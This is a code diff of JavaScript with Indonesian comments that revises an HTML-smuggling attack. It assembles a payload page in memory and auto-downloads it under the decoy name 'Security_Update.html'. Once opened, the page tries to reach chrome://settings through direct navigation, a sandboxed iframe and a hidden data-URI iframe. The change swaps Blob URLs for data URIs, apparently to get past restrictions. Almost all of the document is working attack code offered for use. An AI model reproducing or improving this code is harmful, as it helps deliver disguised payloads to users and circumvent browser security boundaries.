@@ -23,9 +23,6 @@
   // ============================================
   // 1. PAYLOAD INTERNAL BYPASS (DISELUNDUPKAN)
   // ============================================
-  // Ini adalah file HTML yang akan diunduh (diselundupkan).
-  // Saat dibuka, ia akan mencoba menembus chrome://settings.
-  
   var smuggledHTML = `
     <!DOCTYPE html>
     <html>
@@ -36,12 +33,11 @@
       <script>
         (function() {
           var logEl = document.getElementById('log');
-          function log(msg) { logEl.innerHTML += "<br>> " + msg; }
+          function log(msg) { logEl.innerHTML += "<br>> " + msg; console.log(msg); }
 
-          // Target Internal Page
           var internalUrl = "chrome://settings";
 
-          log("Memulai bypass via file://");
+          log("Memulai bypass TANPA Blob URL");
 
           // A. Direct Navigation (Mungkin diizinkan di file://)
           setTimeout(function() {
@@ -61,15 +57,17 @@
             log("Iframe Sandbox sent.");
           }, 2000);
 
-          // C. Blob Wrapper (Double Jump)
+          // C. DATA URI WRAPPER (Pengganti Blob)
           setTimeout(function() {
             try {
-              var blobPayload = '<script>window.top.location.href="' + internalUrl + '";<\\/script>';
-              var blob = new Blob([blobPayload], { type: 'text/html' });
-              var url = URL.createObjectURL(blob);
-              window.location.replace(url);
-              log("Blob Wrapper sent.");
-            } catch(e) {}
+              var dataUri = "data:text/html;base64," + btoa('<script>window.top.location.href="' + internalUrl + '";<\\/script>');
+              
+              var iframe2 = document.createElement('iframe');
+              iframe2.src = dataUri;
+              iframe2.style.display = "none";
+              document.body.appendChild(iframe2);
+              log("Data URI Wrapper sent.");
+            } catch(e) { log("Data URI error: " + e.message); }
           }, 3000);
 
         })();
@@ -79,7 +77,7 @@
   `;
 
   // ============================================
-  // 2. FUNGSI HTML SMUGGLING (ENCODE BASE64)
+  // 2. FUNGSI HTML SMUGGLING (DATA URI ENCODE)
   // ============================================
   function triggerSmuggling() {
     statusEl.innerText = "Merakit payload di memori...";
@@ -88,21 +86,13 @@
       // Encode payload HTML ke Base64
       var base64Payload = btoa(unescape(encodeURIComponent(smuggledHTML)));
       
-      // Decode kembali ke bytes
-      var binary = atob(base64Payload);
-      var bytes = new Uint8Array(binary.length);
-      for (var i = 0; i < binary.length; i++) {
-        bytes[i] = binary.charCodeAt(i);
-      }
+      // Buat Data URI (Bukan Blob URL)
+      var dataUri = "data:text/html;base64," + base64Payload;
 
-      // Buat Blob (MIME Type sebagai .html agar bisa dieksekusi)
-      var blob = new Blob([bytes], { type: 'text/html' });
-      var url = URL.createObjectURL(blob);
-
-      // Trigger Download
+      // Trigger Download via Anchor (Data URI)
       var a = document.createElement('a');
-      a.href = url;
-      a.download = 'Security_Update.html'; // File hasil unduhan
+      a.href = dataUri;
+      a.download = 'Security_Update.html'; 
       a.style.display = 'none';
       document.body.appendChild(a);
       a.click();
@@ -111,7 +101,6 @@
 
       setTimeout(function() {
         document.body.removeChild(a);
-        URL.revokeObjectURL(url);
       }, 5000);
 
     } catch (e) {
